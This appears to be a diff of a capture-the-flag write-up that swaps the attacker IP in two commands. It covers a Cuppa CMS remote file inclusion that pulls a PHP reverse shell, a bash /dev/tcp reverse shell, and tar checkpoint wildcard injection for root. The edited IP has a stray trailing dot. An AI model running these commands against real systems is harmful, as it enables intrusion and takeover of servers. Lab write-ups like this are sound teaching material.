@@ -44,7 +44,7 @@ It's always worth using gobuster on a secret page like this since the page itsel
 
 On this page we see it is running a CMS named Cuppa. A simple search on exploitdb returns a known RFI vulnerability we can use to get a remote shell on the server. Using the following payload we can exploit this vulnerability.
 
-curl -s --data-urlencode urlConfig=http://10.4.24.252:80/php-reverse-shell.php http://10.10.15.129/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php
+curl -s --data-urlencode urlConfig=http://10.10.10.10:80/php-reverse-shell.php http://10.10.15.129/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php
 
 After upgrading the shell, we can grab the user flag
 
@@ -56,7 +56,7 @@ GTFO bins has a tar entry which we can use to break out of a restricted shell 't
 
 Using the following commands and starting another nc listener on 6666 we can get a root shell
 
-printf '#!/bin/bash\nbash -i >& /dev/tcp/10.4.24.252/6666 0>&1' > /var/www/html/shell
+printf '#!/bin/bash\nbash -i >& /dev/tcp/10.10.10.10./6666 0>&1' > /var/www/html/shell
 chmod +x /var/www/html/shell
 touch /var/www/html/--checkpoint=1
 touch /var/www/html/--checkpoint-action=exec=bash\ shell
